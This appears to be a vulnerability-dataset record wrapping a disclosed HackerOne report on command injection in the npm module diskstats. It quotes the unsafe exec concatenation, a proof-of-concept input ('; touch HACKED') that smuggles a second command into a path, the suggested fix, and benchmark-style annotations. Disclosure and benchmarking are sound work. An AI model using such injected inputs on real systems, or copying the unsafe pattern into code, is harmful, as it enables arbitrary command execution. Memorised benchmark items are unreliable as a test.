@@ -1,0 +1,53 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "d3lla ",
+  "title": "[diskstats] Command Injection via insecure command concatenation",
+  "content": "\nI would like to report a Command Injection issue in the diskstats module.\nIt allows to execute arbitrary commands on the victim's PC.\nModule\nmodule name: diskstats\nversion: 0.0.2\nnpm page: https://www.npmjs.com/package/diskstats\nModule Description\nThis library uses df to pull disk information such as free space & inode utilization on your system. This library only works on systems where df is installed and present within your path.\nModule Stats\n[2] weekly downloads\nVulnerability\nVulnerability Description\nThe issue occurs because a user input parameter is used inside a command that is executed without any check.\nHere's the code which causes the issue:\nCode 955 Bytes\n1// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L44\n2....\n3stat.prototype._fetchSpace = function(path) {\n4\treturn new Promise((resolve, reject) => {\n5\t\tthis.child_process.exec('df ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection\n6\t\t\tif (err) {\n7\t\t\t\treturn reject(err);\n8\t\t\t}\t\t\t\n9\n10\t\t\treturn resolve(this._parseResponse(stdout));\n11\t\t});\n12\t});\n13};\n14\n15// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L56\n16stat.prototype._fetchInodes = function(path) {\n17\treturn new Promise((resolve, reject) => {\n18\t\tthis.child_process.exec('df -i ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection\n19\t\t\tif (err) {\n20\t\t\t\treturn reject(err);\n21\t\t\t}\n22\n23\t\t\treturn resolve(this._parseResponse(stdout));\n24\t\t});\n25\t});\n26};\n27...\n28module.exports = function(child_process, path) {\n29\tif (!child_process) {\n30\t\tchild_process = require('child_process');\n31\t}\n32\n33\tif (!path) {\n34\t\tpath = require('path');\n35\t}\n36\n37\treturn new stat(child_process, path);\n38}\nThe path parameter is used to build the command that is passed to the child_process.exec function without any check.\nSteps To Reproduce:\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall diskstats module:\nnpm i diskstats\nnpm i diskstats\ncreate the following PoC JavaScript file (poc.js):\nCode 97 Bytes\n1const diskstats = require('diskstats');\n2diskstats.check('; touch HACKED', (err, results) => {});\n3\nmake sure that the HACKED file does not exist:\nls\nls\nexecute the poc.js file:\nnode poc.js\nnode poc.js\nthe HACKED file is created:\nls\nls\nPatch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it.\nIn my opinion, it's better to use child_process.execFile or child_process.spawn functions instead of child_process.exec.\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.1.0\nNPM VERSION: 6.14.4\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nCommand Injection on diskstats module via insecure command concatenation.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1595545860,
+  "report_url": "https://hackerone.com/reports/864354",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the diskstats module: npm i diskstats"
+    ],
+    [
+      2,
+      "Create a PoC JavaScript file (poc.js) with the following content: const diskstats = require('diskstats'); diskstats.check('; touch HACKED', (err, results) => {});"
+    ],
+    [
+      3,
+      "Execute the PoC file: node poc.js"
+    ],
+    [
+      4,
+      "Verify that the HACKED file was created: ls"
+    ]
+  ],
+  "vuln_description": "The diskstats module is vulnerable to command injection via insecure command concatenation in the _fetchSpace and _fetchInodes functions. User-supplied input (path) is directly concatenated into a command executed by child_process.exec without proper sanitization, allowing arbitrary command execution.",
+  "reason": "The vulnerability is straightforward to discover as it follows a common pattern of insecure command construction. The attack requires no complex interactions or state manipulation - just identifying the unsanitized user input being passed to exec(). This is a well-known vulnerability pattern in Node.js applications.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection via insecure command concatenation in a Node.js module, which is not related to authentication or authorization (AuthN/AuthZ) boundaries. The proposed methodologies focus on detecting AuthN/AuthZ bypasses and IDOR vulnerabilities by testing user sessions and resource access patterns, not command injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
